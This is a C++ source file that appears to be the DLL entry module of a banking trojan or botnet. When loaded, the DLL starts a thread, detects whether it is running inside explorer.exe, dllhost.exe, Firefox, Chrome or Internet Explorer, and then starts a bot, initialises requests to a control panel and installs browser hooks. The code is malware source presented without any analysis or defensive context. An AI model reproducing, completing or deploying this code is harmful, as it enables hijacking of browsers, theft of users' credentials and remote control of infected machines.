#pragma comment(linker, "/ENTRY:DllMain")

extern "C" int _fltused = 0;

#include "..\common.h"
#include "..\wow64ext\wow64ext.h"
#include "FirefoxChrome.h"
#include "IE.h"
#include "Explorer.h"
#include "Bot.h"

static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
   DWORD pid;
   Funcs::pGetWindowThreadProcessId(hwnd, &pid);
   if(pid == Funcs::pGetCurrentProcessId())
      return FALSE;
   return TRUE;
}

static void WaitForWindow()
{
   for(;;)
   {
      if(!Funcs::pEnumWindows(EnumWindowsProc, NULL))
         return;
      Sleep(100);
   }
}

static DWORD WINAPI EntryThread(LPVOID lpParam)
{
   char  exePath[MAX_PATH] = { 0 };
   char *exeName;
   Funcs::pGetModuleFileNameA(NULL, exePath, MAX_PATH);
   exeName = Funcs::pPathFindFileNameA(exePath);

   char mutexName[MAX_PATH] = { 0 };
   char botId[BOT_ID_LEN]   = { 0 };


   if(Funcs::pLstrcmpiA(exeName, Strs::dllhostExe) == 0)
   {
#if !_WIN64
      InitPanelRequest();
      InitWow64ext();
      StartBot();
#endif
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::explorerExe) == 0)
      HookExplorer();
   else if(Funcs::pLstrcmpiA(exeName, Strs::firefoxExe) == 0)
   {
      WaitForWindow();
      InitPanelRequest();              
      HookFirefox();
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::chromeExe) == 0)
   {
      WaitForWindow();
      InitPanelRequest();
      HookChrome();
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::iexploreExe) == 0)
   {
      WaitForWindow();
      InitPanelRequest();
      HookIe();
   }
   return 0;
} 

BOOL WINAPI DllMain
(
   HINSTANCE hModule,
   DWORD dwReason,
   LPVOID lpArgs
)
{
   switch(dwReason)
   {
     case DLL_PROCESS_ATTACH:
     {
         InitApi();
         Funcs::pCreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
         break;
      }
   }
   return TRUE;
}